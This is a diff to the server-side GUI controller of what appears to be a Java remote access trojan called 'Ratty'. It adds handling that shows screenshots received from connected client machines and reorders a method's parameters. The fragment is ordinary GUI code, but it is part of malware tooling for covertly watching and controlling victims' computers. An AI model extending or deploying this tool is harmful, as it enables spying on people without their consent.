@@ -1,5 +1,7 @@
 package de.sogomn.rat.server.gui;
 
+import java.awt.image.BufferedImage;
+
 import de.sogomn.rat.ActiveConnection;
 import de.sogomn.rat.packet.ClipboardPacket;
 import de.sogomn.rat.packet.CommandPacket;
@@ -29,6 +31,12 @@ public final class RattyGuiController extends AbstractRattyController implements
 	 * HANDLING
 	 * ==================================================
 	 */
+	
+	private void showScreenshot(final ServerClient client, final ScreenshotPacket packet) {
+		final BufferedImage image = packet.getImage();
+		
+		client.displayPanel.showImage(image);
+	}
 	
 	private PopupPacket createPopupPacket() {
 		final String input = gui.getInput();
@@ -70,7 +78,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		//...
 	}
 	
-	private IPacket getPacket(final String command, final ServerClient client) {
+	private IPacket getPacket(final ServerClient client, final String command) {
 		IPacket packet = null;
 		
 		if (command == RattyGui.FREE) {
@@ -94,6 +102,14 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	@Override
 	protected boolean handlePacket(final ServerClient client, final IPacket packet) {
+		final Class<? extends IPacket> clazz = packet.getClass();
+		
+		if (clazz == ScreenshotPacket.class) {
+			final ScreenshotPacket screenshot = (ScreenshotPacket)packet;
+			
+			showScreenshot(client, screenshot);
+		}
+		
 		return false;
 	}
 	
@@ -129,7 +145,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	@Override
 	public void userInput(final String command) {
 		final ServerClient client = gui.getLastServerClientClicked();
-		final IPacket packet = getPacket(command, client);
+		final IPacket packet = getPacket(client, command);
 		
 		handleCommand(client, command);
 		
